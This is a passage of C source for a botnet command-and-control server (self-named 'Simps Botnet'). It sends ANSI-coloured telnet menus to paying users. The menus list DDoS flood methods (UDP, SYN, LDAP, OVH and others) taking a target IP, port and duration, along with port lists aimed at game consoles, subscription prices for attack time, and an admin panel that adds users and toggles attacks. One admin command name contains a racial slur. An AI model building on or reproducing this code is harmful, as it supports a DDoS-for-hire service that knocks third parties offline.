			sprintf(idke, "\e[31m║ Admin   \e[95m>\e[31m Shows \e[95mAdmin Panel       ║ \r\n");
			sprintf(idkf, "\e[31m║ Prices  \e[95m>\e[31m Shows \e[95mNet Prices        ║ \r\n");
			sprintf(idkg, "\e[31m║ Owners  \e[95m>\e[31m Shows \e[95mNet Owners        ║ \r\n");
			sprintf(idkh, "\e[31m║ Info    \e[95m>\e[31m Shows \e[95mAccount Info      ║ \r\n");
			sprintf(idki, "\e[31m║ Change  \e[95m>\e[31m Change\e[95m Account Info     ║ \r\n");
			sprintf(idkj, "\e[31m╚═════════════════\e[95m══════════════════╝ \r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, idk1, strlen(idk1), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idk1, 0, sizeof(idk1));
			if (send(datafd, idk2, strlen(idk2), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idk2, 0, sizeof(idk2));
			if (send(datafd, idk3, strlen(idk3), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idk3, 0, sizeof(idk3));
			if (send(datafd, idk4, strlen(idk4), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idk4, 0, sizeof(idk4));
			if (send(datafd, idk5, strlen(idk5), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idk5, 0, sizeof(idk5));
			if (send(datafd, idk6, strlen(idk6), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idk6, 0, sizeof(idk6));
			if (send(datafd, idk7, strlen(idk7), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idk7, 0, sizeof(idk7));
			if (send(datafd, idk8, strlen(idk8), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idk8, 0, sizeof(idk8));
			if (send(datafd, idk9, strlen(idk9), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idk9, 0, sizeof(idk9));
			if (send(datafd, idka, strlen(idka), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idka, 0, sizeof(idka));
			if (send(datafd, idkb, strlen(idkb), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idkb, 0, sizeof(idkb));
			if (send(datafd, idkc, strlen(idkc), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idkc, 0, sizeof(idkc));
			if (send(datafd, idkd, strlen(idkd), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idkd, 0, sizeof(idkd));
			if (send(datafd, idke, strlen(idke), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idke, 0, sizeof(idke));
			if (send(datafd, idkf, strlen(idkf), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idkf, 0, sizeof(idkf));
			if (send(datafd, idkg, strlen(idkg), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idkg, 0, sizeof(idkg));
			if (send(datafd, idkh, strlen(idkh), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idkh, 0, sizeof(idkh));
			if (send(datafd, idki, strlen(idki), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idki, 0, sizeof(idki));
			if (send(datafd, idkj, strlen(idkj), MSG_NOSIGNAL) == -1)
				goto end;
			memset(idkj, 0, sizeof(idkj));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "METHODS") || strcasestr(buf, "ATTACK"))
		{
			if (ToggleAttacks == 0)
			{
				sprintf(Title[datafd].string, accounts[find_line].expiry);
				Title[datafd].login = 4;
				char ggs1[800];
				char ggs2[800];
				char ggs3[800];
				char ggs4[800];
				char ggs5[800];
				char ggs6[800];
				char ggs7[800];
				char ggs8[800];
				char ggs9[800];
				char ggs10[800];
				char ggs11[800];
				char ggs12[800];
				char ggs13[800];
				char ggs14[800];
				char ggs15[800];
				char ggs16[800];

				sprintf(ggs1, "\e[31m            ╔════════\e[95m══════════╗           \r\n");
				sprintf(ggs2, "\e[31m            ║ [\e[96m+\e[31m] Met\e[95mhods\e[96m.\e[95m [\e[96m+\e[95m] ║           \r\n");
				sprintf(ggs3, "\e[31m╔═══════════╩════════\e[95m══════════╩═══════════╗\r\n");
				sprintf(ggs4, "\e[31m║ . OVH [IP] [PORT] [\e[95mTIME]                 ║\r\n");
				sprintf(ggs5, "\e[31m║ . STD [IP] [PORT] [\e[95mTIME]                 ║\r\n");
				sprintf(ggs6, "\e[31m║ . UDP [IP] [PORT] [\e[95mTIME]                 ║\r\n");
				sprintf(ggs7, "\e[31m║ . DNS [IP] [PORT] [\e[95mTIME]                 ║\r\n");
				sprintf(ggs8, "\e[31m║ . VSE [IP] [PORT] [\e[95mTIME]                 ║\r\n");
				sprintf(ggs9, "\e[31m║ . SYN [IP] [PORT] [\e[95mTIME]                 ║\r\n");
				sprintf(ggs10, "\e[31m║ . RST [IP] [PORT] [\e[95mTIME]                 ║\r\n");
				sprintf(ggs11, "\e[31m║ . FIN [IP] [PORT] [\e[95mTIME]                 ║\r\n");
				sprintf(ggs12, "\e[31m║ . ACK [IP] [PORT] [\e[95mTIME]                 ║\r\n");
				sprintf(ggs13, "\e[31m║ . PSH [IP] [PORT] [\e[95mTIME]                 ║\r\n");
				sprintf(ggs14, "\e[31m║ . LDAP [IP] [PORT] \e[95m[TIME]                ║\r\n");
				sprintf(ggs15, "\e[31m║ . TCPALL [IP] [PORT\e[95m] [TIME]              ║\r\n");
				sprintf(ggs16, "\e[31m╚════════════════════\e[95m══════════════════════╝\r\n");

				if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
					goto end;
				if (send(datafd, ggs1, strlen(ggs1), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs1, 0, sizeof(ggs1));
				if (send(datafd, ggs2, strlen(ggs2), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs2, 0, sizeof(ggs2));
				if (send(datafd, ggs3, strlen(ggs3), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs3, 0, sizeof(ggs3));
				if (send(datafd, ggs4, strlen(ggs4), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs4, 0, sizeof(ggs4));
				if (send(datafd, ggs5, strlen(ggs5), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs5, 0, sizeof(ggs5));
				if (send(datafd, ggs6, strlen(ggs6), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs6, 0, sizeof(ggs6));
				if (send(datafd, ggs7, strlen(ggs7), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs7, 0, sizeof(ggs7));
				if (send(datafd, ggs8, strlen(ggs8), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs8, 0, sizeof(ggs8));
				if (send(datafd, ggs9, strlen(ggs9), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs9, 0, sizeof(ggs9));
				if (send(datafd, ggs10, strlen(ggs10), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs10, 0, sizeof(ggs10));
				if (send(datafd, ggs11, strlen(ggs11), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs11, 0, sizeof(ggs11));
				if (send(datafd, ggs12, strlen(ggs12), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs12, 0, sizeof(ggs12));
				if (send(datafd, ggs13, strlen(ggs13), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs13, 0, sizeof(ggs13));
				if (send(datafd, ggs14, strlen(ggs14), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs14, 0, sizeof(ggs14));
				if (send(datafd, ggs15, strlen(ggs15), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs15, 0, sizeof(ggs15));
				if (send(datafd, ggs16, strlen(ggs16), MSG_NOSIGNAL) == -1)
					goto end;
				memset(ggs16, 0, sizeof(ggs16));
			}
			else
			{
				sprintf(botnet, "\e[37mAttack Are Disabled\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
			}
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "RULES"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 5;
			char weirdterms1[800];
			char weirdterms2[800];
			char weirdterms3[800];
			char weirdterms4[800];
			char weirdterms5[800];
			char weirdterms6[800];
			char weirdterms7[800];
			char weirdterms8[800];
			char weirdterms9[800];
			char weirdtermsa[800];
			char weirdtermsb[800];
			char weirdtermsc[800];
			char weirdtermsd[800];
			char weirdtermse[800];
			char weirdtermsf[800];
			char weirdtermsg[800];

			sprintf(weirdterms1, "\e[31m           ╔═════════════\e[95m═════════════╗\r\n");
			sprintf(weirdterms2, "\e[31m           ║ [+] Terms Of\e[95m Service [+] ║\r\n");
			sprintf(weirdterms3, "\e[31m╔══════════╩═════════════\e[95m═════════════╩══════════╗\r\n");
			sprintf(weirdterms4, "\e[31m║---------------I Underst\e[95mand That:---------------║\r\n");
			sprintf(weirdterms5, "\e[31m║-Complaining & Dming Me \e[95mBullshit = Ban.         ║\r\n");
			sprintf(weirdterms6, "\e[31m║-Attacking Government We\e[95mbsites Are Prohibited.  ║\r\n");
			sprintf(weirdterms7, "\e[31m║-Attacking Dstates Are S\e[95mtrictly Prohibited.     ║\r\n");
			sprintf(weirdterms8, "\e[31m║-Bothering The Owners an\e[95md Admins Are Prohibited.║\r\n");
			sprintf(weirdterms9, "\e[31m║-Dming Admins & Owners A\e[95mnd Ask Stupid Questions.║\r\n");
			sprintf(weirdtermsa, "\e[31m║-Asking For Deals And Re\e[95mfunds is Prohibited.    ║\r\n");
			sprintf(weirdtermsb, "\e[31m║-Everything I Attack Is \e[95mMy Own Responsibility.  ║\r\n");
			sprintf(weirdtermsc, "\e[31m║-Sharing Net Logins/Deta\e[95mils Is Prohibited.      ║\r\n");
			sprintf(weirdtermsd, "\e[31m║-Spamming Attacks To The\e[95m Same Ip Is Prohibited. ║\r\n");
			sprintf(weirdtermse, "\e[31m║-Dont Complain If You Ge\e[95mt Banned With A Reason. ║\r\n");
			sprintf(weirdtermsf, "\e[31m║-If I Break Any One Of T\e[95mhese I Will Get Banned. ║\r\n");
			sprintf(weirdtermsg, "\e[31m╚════════════════════════\e[95m════════════════════════╝\r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, weirdterms1, strlen(weirdterms1), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdterms1, 0, sizeof(weirdterms1));
			if (send(datafd, weirdterms2, strlen(weirdterms2), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdterms2, 0, sizeof(weirdterms2));
			if (send(datafd, weirdterms3, strlen(weirdterms3), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdterms3, 0, sizeof(weirdterms3));
			if (send(datafd, weirdterms4, strlen(weirdterms4), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdterms4, 0, sizeof(weirdterms4));
			if (send(datafd, weirdterms5, strlen(weirdterms5), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdterms5, 0, sizeof(weirdterms5));
			if (send(datafd, weirdterms6, strlen(weirdterms6), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdterms6, 0, sizeof(weirdterms6));
			if (send(datafd, weirdterms7, strlen(weirdterms7), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdterms7, 0, sizeof(weirdterms7));
			if (send(datafd, weirdterms8, strlen(weirdterms8), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdterms8, 0, sizeof(weirdterms8));
			if (send(datafd, weirdterms9, strlen(weirdterms9), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdterms9, 0, sizeof(weirdterms9));
			if (send(datafd, weirdtermsa, strlen(weirdtermsa), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdtermsa, 0, sizeof(weirdtermsa));
			if (send(datafd, weirdtermsb, strlen(weirdtermsb), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdtermsb, 0, sizeof(weirdtermsb));
			if (send(datafd, weirdtermsc, strlen(weirdtermsc), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdtermsc, 0, sizeof(weirdtermsc));
			if (send(datafd, weirdtermsd, strlen(weirdtermsd), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdtermsd, 0, sizeof(weirdtermsd));
			if (send(datafd, weirdtermse, strlen(weirdtermse), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdtermse, 0, sizeof(weirdtermse));
			if (send(datafd, weirdtermsf, strlen(weirdtermsf), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdtermsf, 0, sizeof(weirdtermsf));
			if (send(datafd, weirdtermsg, strlen(weirdtermsg), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdtermsg, 0, sizeof(weirdtermsg));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "CREDIT"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 8;
			char creditkid1[800];
			char creditkid2[800];
			char creditkid3[800];
			char creditkid4[800];
			char creditkid5[800];
			char creditkid6[800];

			sprintf(creditkid5, "\e[31m            ╔═════════\e[95m═════════╗            \r\n");
			sprintf(creditkid6, "\e[31m            ║ [\e[95m+\e[31m] Cred\e[95mits. [\e[31m+\e[95m] ║            \r\n");
			sprintf(creditkid1, "\e[31m╔═══════════╩═════════\e[95m═════════╩═══════════╗\r\n");
			sprintf(creditkid2, "\e[31m║ Simps Botnet Was Mad\e[95me By UR0A and B1NARY ║\r\n");
			sprintf(creditkid3, "\e[31m║  + This Source Was M\e[95made on 12/8/2020 +   ║\r\n");
			sprintf(creditkid4, "\e[31m╚═════════════════════\e[95m═════════════════════╝\r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, creditkid5, strlen(creditkid5), MSG_NOSIGNAL) == -1)
				goto end;
			memset(creditkid5, 0, sizeof(creditkid5));
			if (send(datafd, creditkid6, strlen(creditkid6), MSG_NOSIGNAL) == -1)
				goto end;
			memset(creditkid6, 0, sizeof(creditkid6));
			if (send(datafd, creditkid1, strlen(creditkid1), MSG_NOSIGNAL) == -1)
				goto end;
			memset(creditkid1, 0, sizeof(creditkid1));
			if (send(datafd, creditkid2, strlen(creditkid2), MSG_NOSIGNAL) == -1)
				goto end;
			memset(creditkid2, 0, sizeof(creditkid2));
			if (send(datafd, creditkid3, strlen(creditkid3), MSG_NOSIGNAL) == -1)
				goto end;
			memset(creditkid3, 0, sizeof(creditkid3));
			if (send(datafd, creditkid4, strlen(creditkid4), MSG_NOSIGNAL) == -1)
				goto end;
			memset(creditkid4, 0, sizeof(creditkid4));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "TOS"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 10;
			char weird1[800];
			char weird2[800];
			char weird3[800];
			char weird4[800];
			char weird5[800];
			char weird6[800];
			char weird7[800];
			char weird8[800];
			char weird9[800];
			char weirda[800];
			char weirdb[800];

			sprintf(weirda, "\e[31m         ╔════════\e[95m═════════╗          \r\n");
			sprintf(weirdb, "\e[31m         ║ [+] idk\e[95mtbh. [+] ║          \r\n");
			sprintf(weird1, "\e[31m╔════════╩════════\e[95m═════════╩════════╗ \r\n");
			sprintf(weird2, "\e[31m║  Simps botnet wa\e[95ms made by UR0A    ║ \r\n");
			sprintf(weird3, "\e[31m║  i dont condone \e[95mddos attacks they ║ \r\n");
			sprintf(weird4, "\e[31m║  are federal cri\e[95mmes punishable    ║ \r\n");
			sprintf(weird5, "\e[31m║  a fine up to 10\e[95m,000 dollars      ║ \r\n");
			sprintf(weird6, "\e[31m║  use at your own\e[95m risk I am        ║ \r\n");
			sprintf(weird7, "\e[31m║  in no way respo\e[95mnsible for        ║ \r\n");
			sprintf(weird8, "\e[31m║  your actions   \e[95m                  ║ \r\n");
			sprintf(weird9, "\e[31m╚═════════════════\e[95m══════════════════╝ \r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, weirda, strlen(weirda), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirda, 0, sizeof(weirda));
			if (send(datafd, weirdb, strlen(weirdb), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weirdb, 0, sizeof(weirdb));
			if (send(datafd, weird1, strlen(weird1), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weird1, 0, sizeof(weird1));
			if (send(datafd, weird2, strlen(weird2), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weird2, 0, sizeof(weird2));
			if (send(datafd, weird3, strlen(weird3), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weird3, 0, sizeof(weird3));
			if (send(datafd, weird4, strlen(weird4), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weird4, 0, sizeof(weird4));
			if (send(datafd, weird5, strlen(weird5), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weird5, 0, sizeof(weird5));
			if (send(datafd, weird6, strlen(weird6), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weird6, 0, sizeof(weird6));
			if (send(datafd, weird7, strlen(weird7), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weird7, 0, sizeof(weird7));
			if (send(datafd, weird8, strlen(weird8), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weird8, 0, sizeof(weird8));
			if (send(datafd, weird9, strlen(weird9), MSG_NOSIGNAL) == -1)
				goto end;
			memset(weird9, 0, sizeof(weird9));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "PORTS"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 7;
			char port1[800];
			char port2[800];
			char port3[800];
			char port4[800];
			char port5[800];
			char port6[800];
			char port7[800];
			char port8[800];
			char port9[800];
			char porta[800];
			char portb[800];
			char portc[800];
			char portd[800];
			char porte[800];

			sprintf(port1, "\e[31m         ╔════════\e[95m════════╗         \r\n");
			sprintf(port2, "\e[31m         ║ [+] POR\e[95mTS [+]  ║         \r\n");
			sprintf(port3, "\e[31m╔════════╩════════\e[95m════════╩════════╗\r\n");
			sprintf(port4, "\e[31m║ port\e[95m:\e[31m 21 - ftp  \e[95m                 ║\r\n");
			sprintf(port5, "\e[31m║ port\e[95m:\e[31m 22 - ssh  \e[95m                 ║\r\n");
			sprintf(port6, "\e[31m║ port\e[95m:\e[31m 23 - telne\e[95mt                ║\r\n");
			sprintf(port7, "\e[31m║ port\e[95m:\e[31m 25 - smtp \e[95m                 ║\r\n");
			sprintf(port8, "\e[31m║ port\e[95m:\e[31m 53 - dns  \e[95m                 ║\r\n");
			sprintf(port9, "\e[31m║ port\e[95m:\e[31m 80 - http \e[95m                 ║\r\n");
			sprintf(porta, "\e[31m║ port\e[95m:\e[31m 443 - http\e[95ms                ║\r\n");
			sprintf(portb, "\e[31m║ port\e[95m:\e[31m 3074 - xbo\e[95mx                ║\r\n");
			sprintf(portc, "\e[31m║ port\e[95m:\e[31m 8080 - htt\e[95mp-proxy          ║\r\n");
			sprintf(portd, "\e[31m║ port\e[95m:\e[31m 9307 - pla\e[95mystation         ║\r\n");
			sprintf(porte, "\e[31m╚═════════════════\e[95m═════════════════╝\r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, port1, strlen(port1), MSG_NOSIGNAL) == -1)
				goto end;
			memset(port1, 0, sizeof(port1));
			if (send(datafd, port2, strlen(port2), MSG_NOSIGNAL) == -1)
				goto end;
			memset(port2, 0, sizeof(port2));
			if (send(datafd, port3, strlen(port3), MSG_NOSIGNAL) == -1)
				goto end;
			memset(port3, 0, sizeof(port3));
			if (send(datafd, port4, strlen(port4), MSG_NOSIGNAL) == -1)
				goto end;
			memset(port4, 0, sizeof(port4));
			if (send(datafd, port5, strlen(port5), MSG_NOSIGNAL) == -1)
				goto end;
			memset(port5, 0, sizeof(port5));
			if (send(datafd, port6, strlen(port6), MSG_NOSIGNAL) == -1)
				goto end;
			memset(port5, 0, sizeof(port5));
			if (send(datafd, port7, strlen(port7), MSG_NOSIGNAL) == -1)
				goto end;
			memset(port7, 0, sizeof(port7));
			if (send(datafd, port8, strlen(port8), MSG_NOSIGNAL) == -1)
				goto end;
			memset(port8, 0, sizeof(port8));
			if (send(datafd, port9, strlen(port9), MSG_NOSIGNAL) == -1)
				goto end;
			memset(port9, 0, sizeof(port9));
			if (send(datafd, porta, strlen(porta), MSG_NOSIGNAL) == -1)
				goto end;
			memset(porta, 0, sizeof(porta));
			if (send(datafd, portb, strlen(portb), MSG_NOSIGNAL) == -1)
				goto end;
			memset(portb, 0, sizeof(portb));
			if (send(datafd, portc, strlen(portc), MSG_NOSIGNAL) == -1)
				goto end;
			memset(portc, 0, sizeof(portc));
			if (send(datafd, portd, strlen(portd), MSG_NOSIGNAL) == -1)
				goto end;
			memset(portd, 0, sizeof(portd));
			if (send(datafd, porte, strlen(porte), MSG_NOSIGNAL) == -1)
				goto end;
			memset(porte, 0, sizeof(porte));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "CONTACT"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 9;
			char contact1[800];
			char contact3[800];
			char contact4[800];
			char contact5[800];
			char contact6[800];
			char contact7[800];
			char contact8[800];

			sprintf(contact7, "\e[31m         ╔════════\e[95m═════════╗          \r\n");
			sprintf(contact8, "\e[31m         ║ \e[95m[\e[31m+\e[95m]\e[31m Con\e[95mtact \e[31m[\e[95m+\e[31m]\e[95m ║          \r\n");
			sprintf(contact1, "\e[31m╔════════╩════════\e[95m═════════╩════════╗ \r\n");
			sprintf(contact3, "\e[31m║ Discord\e[95m:\e[31m UR0A#08\e[95m42                ║ \r\n");
			sprintf(contact4, "\e[31m║ Insta\e[95m:\e[31m @ur0a_    \e[95m                 ║ \r\n");
			sprintf(contact5, "\e[31m║ Yt\e[95m:\e[31m itz UR0A     \e[95m                 ║ \r\n");
			sprintf(contact6, "\e[31m╚═════════════════\e[95m══════════════════╝ \r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, contact7, strlen(contact7), MSG_NOSIGNAL) == -1)
				goto end;
			memset(contact7, 0, sizeof(contact7));
			if (send(datafd, contact8, strlen(contact8), MSG_NOSIGNAL) == -1)
				goto end;
			memset(contact8, 0, sizeof(contact8));
			if (send(datafd, contact1, strlen(contact1), MSG_NOSIGNAL) == -1)
				goto end;
			memset(contact1, 0, sizeof(contact1));
			if (send(datafd, contact3, strlen(contact3), MSG_NOSIGNAL) == -1)
				goto end;
			memset(contact3, 0, sizeof(contact3));
			if (send(datafd, contact4, strlen(contact4), MSG_NOSIGNAL) == -1)
				goto end;
			memset(contact4, 0, sizeof(contact4));
			if (send(datafd, contact5, strlen(contact5), MSG_NOSIGNAL) == -1)
				goto end;
			memset(contact5, 0, sizeof(contact5));
			if (send(datafd, contact6, strlen(contact6), MSG_NOSIGNAL) == -1)
				goto end;
			memset(contact6, 0, sizeof(contact6));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "PRICES"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 12;
			char price0[800];
			char price1[800];
			char price2[800];
			char price3[800];
			char price4[800];
			char price5[800];
			char price6[800];
			char price7[800];
			char price8[800];

			sprintf(price0, "\e[31m               ╔═════════\e[95m═════════╗ \r\n");
			sprintf(price1, "\e[31m               ║ [+] .Pri\e[95mces. [+] ║ \r\n");
			sprintf(price2, "\e[31m╔══════════════╩═════════\e[95m═════════╩═══════════════╗ \r\n");
			sprintf(price3, "\e[31m║ Monthly: $15 300 second\e[95ms 30 second cooldown.    ║ \r\n");
			sprintf(price4, "\e[31m║ 3 Months: $30 300 secon\e[95mds 30 second cooldown.   ║ \r\n");
			sprintf(price5, "\e[31m║ Lifetime: $60 300 secon\e[95mds 30 second cooldown.   ║ \r\n");
			sprintf(price6, "\e[31m║ Reseller: $80 300 secon\e[95mds 30 second cooldown.   ║ \r\n");
			sprintf(price7, "\e[31m║ VIP Addon package: $25 \e[95mwill add 700 seconds.    ║ \r\n");
			sprintf(price8, "\e[31m╚════════════════════════\e[95m═════════════════════════╝ \r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, price0, strlen(price0), MSG_NOSIGNAL) == -1)
				goto end;
			memset(price0, 0, sizeof(price0));
			if (send(datafd, price1, strlen(price1), MSG_NOSIGNAL) == -1)
				goto end;
			memset(price1, 0, sizeof(price1));
			if (send(datafd, price2, strlen(price2), MSG_NOSIGNAL) == -1)
				goto end;
			memset(price2, 0, sizeof(price2));
			if (send(datafd, price3, strlen(price3), MSG_NOSIGNAL) == -1)
				goto end;
			memset(price3, 0, sizeof(price3));
			if (send(datafd, price4, strlen(price4), MSG_NOSIGNAL) == -1)
				goto end;
			memset(price4, 0, sizeof(price4));
			if (send(datafd, price5, strlen(price5), MSG_NOSIGNAL) == -1)
				goto end;
			memset(price5, 0, sizeof(price5));
			if (send(datafd, price6, strlen(price6), MSG_NOSIGNAL) == -1)
				goto end;
			memset(price6, 0, sizeof(price6));
			if (send(datafd, price7, strlen(price7), MSG_NOSIGNAL) == -1)
				goto end;
			memset(price7, 0, sizeof(price7));
			if (send(datafd, price8, strlen(price8), MSG_NOSIGNAL) == -1)
				goto end;
			memset(price8, 0, sizeof(price8));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "ADMIN"))
		{
		id:
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 11;
			char admin1[800];
			char admin2[800];
			char admin3[800];
			char admin4[800];
			char admin5[800];
			char admin6[800];
			char admin7[800];
			char admin8[800];
			char admin9[800];
			char admin10[800];
			char admin11[800];
			char admin12[800];

			sprintf(admin1, "\e[31m             ╔═══════════\e[95m═════════╗               \r\n");
			sprintf(admin2, "\e[31m             ║ [\e[96m+\e[31m] \e[96m.\e[31mAdmin\e[95mHub\e[96m.\e[95m [\e[96m+\e[95m] ║               \r\n");
			sprintf(admin3, "\e[31m╔════════════╩═══════════\e[95m═════════╩═══════════════╗ \r\n");
			sprintf(admin4, "\e[31m║ Adduser \e[95m> \e[31mThis Will Add\e[95m A User                  ║ \r\n");
			sprintf(admin5, "\e[31m║ Addnigg \e[95m> \e[31mThis Will Add\e[95m A Admin                 ║ \r\n");
			sprintf(admin6, "\e[31m║ Remuser \e[95m> \e[31mThis Will Rem\e[95move A User               ║ \r\n");
			sprintf(admin7, "\e[31m║ Arches  \e[95m> \e[31mShows Device \e[95mArches                   ║ \r\n");
			sprintf(admin8, "\e[31m║ Motd    \e[95m> \e[31mGive Out A Me\e[95mntion Of The Day         ║ \r\n");
			sprintf(admin9, "\e[31m║ MdOff   \e[95m> \e[31mTurn Off Ment\e[95mion Of The Day           ║ \r\n");
			sprintf(admin10, "\e[31m║ ToggleBitchesOn \e[95m > \e[31mTurn\e[95ms Attacks on             ║ \r\n");
			sprintf(admin11, "\e[31m║ ToggleBitchesOff\e[95m > \e[31mTurn\e[95ms Attacks off            ║ \r\n");
			sprintf(admin12, "\e[31m╚════════════════════════\e[95m═════════════════════════╝ \r\n");

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, admin1, strlen(admin1), MSG_NOSIGNAL) == -1)
				goto end;
			memset(admin1, 0, sizeof(admin1));
			if (send(datafd, admin2, strlen(admin2), MSG_NOSIGNAL) == -1)
				goto end;
			memset(admin2, 0, sizeof(admin2));
			if (send(datafd, admin3, strlen(admin3), MSG_NOSIGNAL) == -1)
				goto end;
			memset(admin3, 0, sizeof(admin3));
			if (send(datafd, admin4, strlen(admin4), MSG_NOSIGNAL) == -1)
				goto end;
			memset(admin4, 0, sizeof(admin4));
			if (send(datafd, admin5, strlen(admin5), MSG_NOSIGNAL) == -1)
				goto end;
			memset(admin5, 0, sizeof(admin5));
			if (send(datafd, admin6, strlen(admin6), MSG_NOSIGNAL) == -1)
				goto end;
			memset(admin6, 0, sizeof(admin6));
			if (send(datafd, admin7, strlen(admin7), MSG_NOSIGNAL) == -1)
				goto end;
			memset(admin7, 0, sizeof(admin7));
			if (send(datafd, admin8, strlen(admin8), MSG_NOSIGNAL) == -1)
				goto end;
			memset(admin8, 0, sizeof(admin8));
			if (send(datafd, admin9, strlen(admin9), MSG_NOSIGNAL) == -1)
				goto end;
			memset(admin9, 0, sizeof(admin9));
			if (send(datafd, admin10, strlen(admin10), MSG_NOSIGNAL) == -1)
				goto end;
			memset(admin10, 0, sizeof(admin10));
			if (send(datafd, admin11, strlen(admin11), MSG_NOSIGNAL) == -1)
				goto end;
			memset(admin11, 0, sizeof(admin11));
			if (send(datafd, admin12, strlen(admin12), MSG_NOSIGNAL) == -1)
				goto end;
			memset(admin12, 0, sizeof(admin12));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "TOGGLEBITCHESOFF"))
		{
			if (strcmp(admin, accounts[find_line].id) == 0)
			{
				sprintf(Title[datafd].string, accounts[find_line].expiry);
